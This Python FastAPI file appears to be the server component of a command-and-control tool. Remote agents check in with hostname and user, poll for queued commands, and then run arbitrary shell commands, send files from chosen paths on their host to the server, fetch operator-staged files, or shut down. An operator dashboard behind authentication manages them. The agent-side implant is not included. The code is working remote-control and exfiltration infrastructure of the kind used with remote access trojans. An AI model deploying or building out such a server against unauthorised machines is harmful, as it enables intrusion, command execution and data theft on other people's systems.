from typing import Union, Dict
from agent import Agent
from fastapi import FastAPI, Request, HTTPException, UploadFile, File, Depends
from fastapi.responses import FileResponse
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel
from collections import defaultdict
from models import *
import auth_routes
from dependencies import get_current_user
import random
import os
import shutil
from pathlib import Path
import uvicorn
from datetime import datetime


app = FastAPI()

# CORS middleware for Next.js frontend
app.add_middleware(
    CORSMiddleware,
    allow_origins=["http://localhost:3000"],  # Next.js dev server
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# Include authentication routes
app.include_router(auth_routes.router)

# id : agent
agents = {}

# Configuration constants
UPLOAD_DIR = Path("uploads")
UPLOAD_DIR.mkdir(exist_ok=True)
MAX_FILE_SIZE = 100 * 1024 * 1024  # 100MB limit for file uploads/downloads

################### for server
@app.get("/agents")
def get_agents(user: Dict = Depends(get_current_user)):
    """Get list of all agents with their details"""
    return [agents[agent_id].to_dict() for agent_id in agents]

@app.get("/agent/{agent_id}")
def get_agent(agent_id: int, user: Dict = Depends(get_current_user)):
    """Get detailed info about a specific agent"""
    if agent_id not in agents:
        raise HTTPException(status_code=404, detail=f"Agent {agent_id} not found")
    ag: Agent = agents[agent_id]
    agent_data = ag.to_dict()
    # Add command history
    agent_data['commands'] = [
        {
            'command_id': cid,
            'type': cmd['type'],
            'data': cmd['data'],
            'status': cmd['status'],
            'result': cmd.get('result'),
            'error': cmd.get('error'),
            'created_at': cmd['created_at'],
            'completed_at': cmd.get('completed_at')
        }
        for cid, cmd in ag.commands.items()
    ]
    agent_data['uploaded_files'] = ag.uploaded_files
    agent_data['downloaded_files'] = ag.downloaded_files
    return agent_data

@app.delete("/agent/{agent_id}")
def delete_agent(agent_id: int, user: Dict = Depends(get_current_user)):
    """Delete an agent and all associated files"""
    if agent_id not in agents:
        raise HTTPException(status_code=404, detail=f"Agent {agent_id} not found")

    ag: Agent = agents[agent_id]

    # Check if agent is online (last seen within 15 seconds)
    last_seen = datetime.fromisoformat(ag.last_seen)
    now = datetime.now()
    diff_seconds = (now - last_seen).total_seconds()
    is_online = diff_seconds < 15

    # If agent is online, send terminate command first
    if is_online:
        try:
            ag.add_command("terminate", {})
            # Wait briefly for agent to process terminate command
            import time
            time.sleep(3)
        except Exception as e:
            print(f"Warning: Failed to send terminate command: {e}")
            # Continue with deletion anyway

    # Remove agent from dictionary
    del agents[agent_id]

    # Delete agent's upload directory and all files
    agent_dir = UPLOAD_DIR / f"agent_{agent_id}"
    if agent_dir.exists():
        try:
            shutil.rmtree(agent_dir)
        except Exception as e:
            # Log error but don't fail the deletion
            print(f"Warning: Failed to delete directory {agent_dir}: {e}")

    return {
        'status': 'success',
        'message': f'Agent {agent_id} deleted successfully',
        'terminated': is_online
    }

################### Command Management (Server side)
@app.post("/create_command/{agent_id}")
def create_exec_command(agent_id: int, command: str, user: Dict = Depends(get_current_user)):
    """Legacy endpoint - create an exec command"""
    if agent_id not in agents:
        raise HTTPException(status_code=404, detail=f"Agent {agent_id} not found")
    ag: Agent = agents[agent_id]
    command_id = ag.add_command("exec", {"command": command})
    return {'command_id': command_id, 'type': 'exec'}


@app.post("/command/{agent_id}/exec")
def create_exec_command_v2(agent_id: int, command: str, user: Dict = Depends(get_current_user)):
    """Create an exec command"""
    if agent_id not in agents:
        raise HTTPException(status_code=404, detail=f"Agent {agent_id} not found")
    ag: Agent = agents[agent_id]
    command_id = ag.add_command("exec", {"command": command})
    return {'command_id': command_id, 'type': 'exec', 'status': 'queued'}


@app.post("/command/{agent_id}/upload")
def create_upload_command(agent_id: int, source_path: str, filename: str = None, user: Dict = Depends(get_current_user)):
    """
    Create an upload command - agent will upload a file from source_path

    Args:
        agent_id: The agent ID
        source_path: Path on agent's machine to upload
        filename: Optional custom filename (defaults to basename of source_path)
    """
    if agent_id not in agents:
        raise HTTPException(status_code=404, detail=f"Agent {agent_id} not found")

    if not filename:
        filename = os.path.basename(source_path)

    ag: Agent = agents[agent_id]
    command_id = ag.add_command("upload", {
        "source_path": source_path,
        "filename": filename
    })
    return {
        'command_id': command_id,
        'type': 'upload',
        'status': 'queued',
        'message': f'Agent will upload {source_path} as {filename}'
    }


@app.post("/command/{agent_id}/download")
def create_download_command(agent_id: int, filename: str, save_as: str = None, user: Dict = Depends(get_current_user)):
    """
    Create a download command - agent will download a file from server

    Args:
        agent_id: The agent ID
        filename: File in the agent's directory to download
        save_as: Optional path where agent should save the file
    """
    if agent_id not in agents:
        raise HTTPException(status_code=404, detail=f"Agent {agent_id} not found")

    # Check if file exists in agent's directory
    agent_dir = UPLOAD_DIR / f"agent_{agent_id}"
    file_path = agent_dir / filename

    if not file_path.exists():
        raise HTTPException(status_code=404, detail=f"File {filename} not found for this agent")

    if not save_as:
        save_as = filename

    ag: Agent = agents[agent_id]
    command_id = ag.add_command("download", {
        "filename": filename,
        "save_as": save_as,
        "url": f"/files/agent_{agent_id}/{filename}"
    })
    return {
        'command_id': command_id,
        'type': 'download',
        'status': 'queued',
        'message': f'Agent will download {filename} and save as {save_as}'
    }


@app.post("/command/{agent_id}/terminate")
def create_terminate_command(agent_id: int, user: Dict = Depends(get_current_user)):
    """
    Create a terminate command - agent will gracefully shut down

    Args:
        agent_id: The agent ID
    """
    if agent_id not in agents:
        raise HTTPException(status_code=404, detail=f"Agent {agent_id} not found")

    ag: Agent = agents[agent_id]
    command_id = ag.add_command("terminate", {})
    return {
        'command_id': command_id,
        'type': 'terminate',
        'status': 'queued',
        'message': f'Agent {agent_id} will terminate'
    }


@app.get("/command/{agent_id}/{command_id}")
def get_command_result(agent_id: int, command_id: int, user: Dict = Depends(get_current_user)):
    """Get the result of a specific command"""
    if agent_id not in agents:
        raise HTTPException(status_code=404, detail=f"Agent {agent_id} not found")
    ag: Agent = agents[agent_id]
    result = ag.get_result(command_id)
    if result is None:
        raise HTTPException(status_code=404, detail=f"Command {command_id} not found")
    return result


################### for agent
@app.post("/join")
def create_agent(hostname: str, user: str, request: Request):
    # Generate a random agent ID that doesn't already exist
    attempts = 0
    max_attempts = 100
    agent_id = random.randint(100000, 999999)  # 6-digit IDs

    while agent_id in agents and attempts < max_attempts:
        agent_id = random.randint(100000, 999999)
        attempts += 1

    if agent_id in agents:
        raise HTTPException(status_code=500, detail="Failed to generate unique agent ID")

    ag = Agent(agent_id, request.client.host, hostname, user)
    agents[agent_id] = ag

    return {'id': agent_id, "status": True}

@app.get("/agent/get_commands/{agent_id}")
def get_commands(agent_id: int):
    if agent_id not in agents:
        raise HTTPException(status_code=404, detail=f"Agent {agent_id} not found")
    ag: Agent = agents[agent_id]
    ag.update_last_seen()  # Update last seen on every poll
    commands = ag.get_commands()
    return {'commands': commands}



@app.post("/agent/set_commands")
def set_commands(commands: Commands):
    """Legacy endpoint - for backward compatibility"""
    if commands.agent_id not in agents:
        raise HTTPException(status_code=404, detail=f"Agent {commands.agent_id} not found")
    ag: Agent = agents[commands.agent_id]
    for command in commands.commands:
        ag.set_result(command.command_id, "success", result=command.result)
    return {'status': True}


@app.post("/agent/set_command_result")
def set_command_result(agent_id: int, command_id: int, status: str, result: str = None, error: str = None):
    """New endpoint - agent reports command result"""
    if agent_id not in agents:
        raise HTTPException(status_code=404, detail=f"Agent {agent_id} not found")
    ag: Agent = agents[agent_id]
    success = ag.set_result(command_id, status, result, error)
    if not success:
        raise HTTPException(status_code=404, detail=f"Command {command_id} not found")
    return {'status': True, 'message': 'Result recorded'}


################### File transfer endpoints
@app.post("/agent/upload_file")
async def agent_upload_file(agent_id: int, file: UploadFile = File(...)):
    """
    Agent uploads a file to the server
    This is called by the agent when executing an 'upload' command
    """
    if agent_id not in agents:
        raise HTTPException(status_code=404, detail=f"Agent {agent_id} not found")

    # Sanitize filename to prevent path traversal
    safe_filename = Path(file.filename).name

    # Create agent-specific directory
    agent_dir = UPLOAD_DIR / f"agent_{agent_id}"
    agent_dir.mkdir(exist_ok=True)

    # Save the uploaded file
    file_path = agent_dir / safe_filename

    # Check file size
    file.file.seek(0, 2)
    file_size = file.file.tell()
    file.file.seek(0)

    if file_size > MAX_FILE_SIZE:
        raise HTTPException(status_code=413, detail=f"File too large (max {MAX_FILE_SIZE // (1024*1024)}MB)")

    with open(file_path, "wb") as buffer:
        shutil.copyfileobj(file.file, buffer)

    # Track the upload in agent
    ag: Agent = agents[agent_id]
    ag.add_uploaded_file(safe_filename, str(file_path), file_size)

    return {
        'status': 'success',
        'filename': safe_filename,
        'size': file_size
    }


@app.get("/files/{agent_dir}/{filename}")
async def serve_file(agent_dir: str, filename: str):
    """
    Serve a file for agent download
    This is called by the agent when executing a 'download' command
    URL format: /files/agent_{agent_id}/{filename}
    """
    # Sanitize filename to prevent path traversal
    safe_filename = Path(filename).name

    # Construct file path
    file_path = UPLOAD_DIR / agent_dir / safe_filename

    if not file_path.exists():
        raise HTTPException(status_code=404, detail=f"File {safe_filename} not found")

    # Extract agent_id from agent_dir (format: agent_123456)
    if agent_dir.startswith("agent_"):
        try:
            agent_id = int(agent_dir.split("_")[1])
            if agent_id in agents:
                ag: Agent = agents[agent_id]
                ag.add_downloaded_file(safe_filename)
        except (ValueError, IndexError):
            pass  # Invalid format, just serve the file without tracking

    return FileResponse(
        path=str(file_path),
        filename=safe_filename,
        media_type='application/octet-stream'
    )


@app.get("/files/{agent_id}")
def list_agent_files(agent_id: int, user: Dict = Depends(get_current_user)):
    """List all files available for an agent"""
    if agent_id not in agents:
        raise HTTPException(status_code=404, detail=f"Agent {agent_id} not found")

    agent_dir = UPLOAD_DIR / f"agent_{agent_id}"

    if not agent_dir.exists():
        return {'files': []}

    files = []
    for file_path in agent_dir.iterdir():
        if file_path.is_file():
            files.append({
                'filename': file_path.name,
                'size': os.path.getsize(file_path)
            })

    return {'files': files}


@app.get("/dashboard/files/{agent_id}/{filename}")
def dashboard_download_file(agent_id: int, filename: str, user: Dict = Depends(get_current_user)):
    """
    Protected endpoint for dashboard users to download files
    This endpoint requires authentication and is used by the frontend
    URL format: /dashboard/files/{agent_id}/{filename}
    """
    if agent_id not in agents:
        raise HTTPException(status_code=404, detail=f"Agent {agent_id} not found")

    # Sanitize filename to prevent path traversal
    safe_filename = Path(filename).name

    # Construct file path
    agent_dir = UPLOAD_DIR / f"agent_{agent_id}"
    file_path = agent_dir / safe_filename

    if not file_path.exists():
        raise HTTPException(status_code=404, detail=f"File {safe_filename} not found")

    return FileResponse(
        path=str(file_path),
        filename=safe_filename,
        media_type='application/octet-stream'
    )


@app.post("/upload_for_agent/{agent_id}")
async def upload_file_for_agent(agent_id: int, file: UploadFile = File(...), user: Dict = Depends(get_current_user)):
    """
    Server operator uploads a file that an agent can download later
    Use this to stage files, then create a download command
    """
    if agent_id not in agents:
        raise HTTPException(status_code=404, detail=f"Agent {agent_id} not found")

    # Sanitize filename
    safe_filename = Path(file.filename).name

    # Create agent-specific directory
    agent_dir = UPLOAD_DIR / f"agent_{agent_id}"
    agent_dir.mkdir(exist_ok=True)

    # Check file size
    file.file.seek(0, 2)
    file_size = file.file.tell()
    file.file.seek(0)

    if file_size > MAX_FILE_SIZE:
        raise HTTPException(status_code=413, detail=f"File too large (max {MAX_FILE_SIZE // (1024*1024)}MB)")

    # Save the uploaded file
    file_path = agent_dir / safe_filename
    with open(file_path, "wb") as buffer:
        shutil.copyfileobj(file.file, buffer)

    return {
        'status': True,
        'filename': safe_filename,
        'size': file_size,
        'message': f'File ready for agent {agent_id} to download',
        'download_url': f'/files/agent_{agent_id}/{safe_filename}'
    }


if __name__ == "__main__":
    uvicorn.run(app, host="0.0.0.0", port=8000)